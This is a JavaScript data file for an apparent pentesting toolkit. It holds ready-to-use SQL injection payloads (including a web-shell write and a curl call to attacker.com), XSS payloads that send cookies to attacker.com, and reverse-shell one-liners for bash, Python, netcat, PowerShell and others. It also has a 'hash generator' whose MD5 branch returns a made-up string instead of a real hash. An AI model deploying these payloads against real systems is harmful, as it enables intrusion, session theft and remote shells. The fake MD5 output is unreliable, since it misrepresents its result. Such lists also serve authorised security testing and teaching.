/* tools-data.js - Data and Logic for Integrated Pentesting Tools */

// ========== Tool 1: Encoder/Decoder ==========
const encoderDecoderTool = {
    encode: {
        base64: (text) => btoa(unescape(encodeURIComponent(text))),
        url: (text) => encodeURIComponent(text),
        html: (text) => text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#039;'),
        hex: (text) => Array.from(text).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''),
        binary: (text) => Array.from(text).map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '),
        rot13: (text) => text.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26))
    },
    decode: {
        base64: (text) => {
            try {
                return decodeURIComponent(escape(atob(text)));
            } catch (e) {
                return 'Error: Invalid Base64';
            }
        },
        url: (text) => {
            try {
                return decodeURIComponent(text);
            } catch (e) {
                return 'Error: Invalid URL encoding';
            }
        },
        html: (text) => {
            const txt = document.createElement('textarea');
            txt.innerHTML = text;
            return txt.value;
        },
        hex: (text) => {
            try {
                return text.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
            } catch (e) {
                return 'Error: Invalid Hex';
            }
        },
        binary: (text) => {
            try {
                return text.split(' ').map(bin => String.fromCharCode(parseInt(bin, 2))).join('');
            } catch (e) {
                return 'Error: Invalid Binary';
            }
        },
        rot13: (text) => text.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26))
    }
};

// ========== Tool 2: Hash Generator ==========
async function generateHash(text, algorithm) {
    const encoder = new TextEncoder();
    const data = encoder.encode(text);

    const algoMap = {
        'md5': 'MD5',
        'sha1': 'SHA-1',
        'sha256': 'SHA-256',
        'sha512': 'SHA-512'
    };

    const algoName = algoMap[algorithm.toLowerCase()];

    if (algorithm.toLowerCase() === 'md5') {
        // MD5 not in Web Crypto API - using simple hash
        return 'MD5_' + text.length + '_' + text.charCodeAt(0);
    }

    const hashBuffer = await crypto.subtle.digest(algoName, data);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// ========== Tool 3: SQL Injection Payloads ==========
const sqlInjectionPayloads = {
    mysql: [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "' OR '1'='1' #",
        "admin' --",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
        "' AND 1=0 UNION ALL SELECT NULL, table_name FROM information_schema.tables--",
        "' AND 1=0 UNION ALL SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--",
        "' AND SLEEP(5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR IF(1=1, SLEEP(5), 0)--",
        "' UNION SELECT @@version--",
        "' UNION SELECT user()--",
        "' UNION SELECT database()--",
        "' INTO OUTFILE '/var/www/html/shell.php'--",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version)))--"
    ],
    postgresql: [
        "' OR '1'='1'--",
        "'; DROP TABLE users--",
        "' UNION SELECT NULL--",
        "' UNION SELECT version()--",
        "' UNION SELECT current_database()--",
        "' UNION SELECT current_user--",
        "' AND pg_sleep(5)--",
        "'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com'--"
    ],
    mssql: [
        "' OR '1'='1'--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' UNION SELECT @@version--",
        "' AND 1=0 UNION ALL SELECT NULL, name FROM sys.databases--",
        "' AND 1=0 UNION ALL SELECT NULL, name FROM sys.tables--",
        "' WAITFOR DELAY '00:00:05'--",
        "'; EXEC sp_configure 'show advanced options', 1--"
    ],
    oracle: [
        "' OR '1'='1'--",
        "' UNION SELECT NULL FROM dual--",
        "' UNION SELECT banner FROM v$version--",
        "' UNION SELECT user FROM dual--",
        "' AND 1=0 UNION SELECT NULL, table_name FROM all_tables--",
        "' AND 1=0 UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS'--"
    ],
    bypass: [
        "' OR 1=1--",
        "' OR 'x'='x",
        "' OR 1=1#",
        "') OR ('1'='1",
        "' OR '1'='1'/*",
        "admin'/**/OR/**/1=1--",
        "' OR 1=1 LIMIT 1--",
        "' UNION/**/SELECT/**/NULL--",
        "' /*!UNION*/ /*!SELECT*/ NULL--",
        "' %55NION %53ELECT NULL--",
        "' UnIoN SeLeCt NULL--"
    ]
};

// ========== Tool 4: XSS Payloads ==========
const xssPayloads = {
    basic: [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>"
    ],
    advanced: [
        "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
        "<img src=x onerror=fetch('http://attacker.com?cookie='+document.cookie)>",
        "<script>new Image().src='http://attacker.com?cookie='+document.cookie</script>",
        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>",
        "<script>var i=new Image();i.src='http://attacker.com?'+document.cookie;</script>"
    ],
    bypass: [
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=alert`XSS`>",
        "<svg><script>alert&#40;'XSS'&#41;</script>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
        "<iframe srcdoc='<script>alert`XSS`</script>'>",
        "<math><mi//xlink:href='data:x,<script>alert`XSS`</script>'>"
    ],
    dom: [
        "#<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "<a href='javascript:alert`XSS`'>Click</a>",
        "<form action='javascript:alert`XSS`'><input type=submit>",
        "'-alert`XSS`-'",
        "\"-alert`XSS`-\"",
        "javascript:eval('alert`XSS`')"
    ],
    polyglot: [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
        "'\"><img src=x onerror=alert('XSS')>",
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "--></script><script>alert('XSS')</script><!--",
        "*/alert('XSS')//",
        "</script><script>alert('XSS')</script>"
    ]
};

// ========== Tool 5: Reverse Shell Generator ==========
const reverseShellTemplates = {
    bash: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    python: (ip, port) => `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
    php: (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    perl: (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    ruby: (ip, port) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    netcat: (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
    netcat_alt: (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    powershell: (ip, port) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
    java: (ip, port) => `r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
    nodejs: (ip, port) => `require('child_process').exec('nc -e /bin/sh ${ip} ${port}')`
};

// ========== Tool 6: Common Subdomains ==========
const commonSubdomains = [
    'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1', 'webdisk',
    'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'api', 'dev', 'staging',
    'test', 'admin', 'portal', 'blog', 'shop', 'store', 'mobile', 'm', 'cdn',
    'static', 'assets', 'img', 'images', 'media', 'upload', 'downloads', 'files',
    'vpn', 'remote', 'ssh', 'git', 'svn', 'mysql', 'db', 'database', 'backup',
    'beta', 'demo', 'old', 'new', 'legacy', 'v1', 'v2', 'app', 'apps', 'cloud'
];

// ========== Tool 7: Common Ports ==========
const commonPorts = [
    { port: 21, service: 'FTP', description: 'File Transfer Protocol' },
    { port: 22, service: 'SSH', description: 'Secure Shell' },
    { port: 23, service: 'Telnet', description: 'Telnet Protocol' },
    { port: 25, service: 'SMTP', description: 'Simple Mail Transfer Protocol' },
    { port: 53, service: 'DNS', description: 'Domain Name System' },
    { port: 80, service: 'HTTP', description: 'Hypertext Transfer Protocol' },
    { port: 110, service: 'POP3', description: 'Post Office Protocol v3' },
    { port: 143, service: 'IMAP', description: 'Internet Message Access Protocol' },
    { port: 443, service: 'HTTPS', description: 'HTTP Secure' },
    { port: 445, service: 'SMB', description: 'Server Message Block' },
    { port: 3306, service: 'MySQL', description: 'MySQL Database' },
    { port: 3389, service: 'RDP', description: 'Remote Desktop Protocol' },
    { port: 5432, service: 'PostgreSQL', description: 'PostgreSQL Database' },
    { port: 5900, service: 'VNC', description: 'Virtual Network Computing' },
    { port: 6379, service: 'Redis', description: 'Redis Database' },
    { port: 8080, service: 'HTTP-Proxy', description: 'HTTP Proxy' },
    { port: 8443, service: 'HTTPS-Alt', description: 'HTTPS Alternative' },
    { port: 27017, service: 'MongoDB', description: 'MongoDB Database' }
];

console.log('Tools data loaded successfully!');
